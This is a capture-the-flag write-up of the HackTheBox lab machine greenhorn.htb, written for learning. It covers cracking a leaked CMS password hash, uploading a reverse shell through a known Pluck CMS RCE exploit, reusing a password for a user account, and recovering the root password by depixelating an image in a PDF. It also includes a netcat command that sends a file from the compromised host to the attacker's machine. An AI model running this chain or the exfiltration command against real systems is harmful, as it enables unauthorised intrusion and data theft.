________________________________________
**Target Overview
**
•	IP Address: 10.10.11.25
•	Domain Name: greenhorn.htb
•	Operating System: Linux (detected via Nmap)
•	Services:
o	SSH (OpenSSH 8.9p1)
o	HTTP (nginx 1.18.0 hosting Pluck CMS)
o	HTTP (Gitea DevOps platform on port 3000)

<img width="778" height="832" alt="image" src="https://github.com/user-attachments/assets/bf17b325-e23f-4a10-81f5-84dd0ba0ec00" />


 
Exploitation
Port 80 (Pluck CMS)
•	CMS version identified as Pluck 4.7.18.
•	Key findings:
o	Endpoints: login.php and admin.php
o	Access to admin.php required login credentials.
Port 3000 (Gitea)
•	Hosted Gitea platform provided the source code for the main website.
•	Source Code Review Findings:
o	Passwords hashed using SHA512.
o	Password hash found at data/settings/pass.php.
Password Retrieval
•	The SHA512 hash in pass.php was dehashed using an online tool.
•	Password: iloveyou1
•	Login successful at login.php.

<img width="813" height="639" alt="image" src="https://github.com/user-attachments/assets/fe2eeeac-074d-423d-9213-72357abe1d15" />

 
________________________________________



Admin Panel Exploitation
•	The admin panel allowed file uploads but had extensions filtering.
•	Initial attempts to bypass restrictions (e.g., null-byte injection) failed.
•	Exploited Pluck CMS RCE vulnerability (Exploit-DB ID: 51592) by uploading a ZIP file containing a reverse shell.
•	Successful RCE established.
 <img width="777" height="778" alt="image" src="https://github.com/user-attachments/assets/96f868e5-9a03-46a0-89b1-fcecea06b29b" />

________________________________________
Privilege Escalation
User junior
•	Found user.txt and a file, Using OpenVAS.pdf, in /home/junior.
•	Attempt to read user.txt was restricted by permissions.
•	Guessed the password for user junior as iloveyou1 (same as admin password). Successful.
File Transfer
•	Used netcat to transfer Using OpenVAS.pdf to the local machine:
  
 
# Sender (on shell):
nc -w 3 10.10.14.77 12345 < 'Using OpenVAS.pdf'

# Receiver (on local machine):
nc -lp 12345 > output.pdf

Root Privilege Escalation
•	The PDF contained a pixelated password for the root account.
•	De-pixelated the password using the Depix tool:
1.	Extracted the image using pdfimages:
  
 
pdfimages output.pdf pix
2.	Used Depix to reconstruct the password.

<img width="860" height="920" alt="image" src="https://github.com/user-attachments/assets/aebe8036-4477-4148-8aba-340abddaa4e5" />

•	Root Password: sidefromsidetheothersidesidefromsidetheotherside
•	Logged in as root and retrieved root.txt.
 



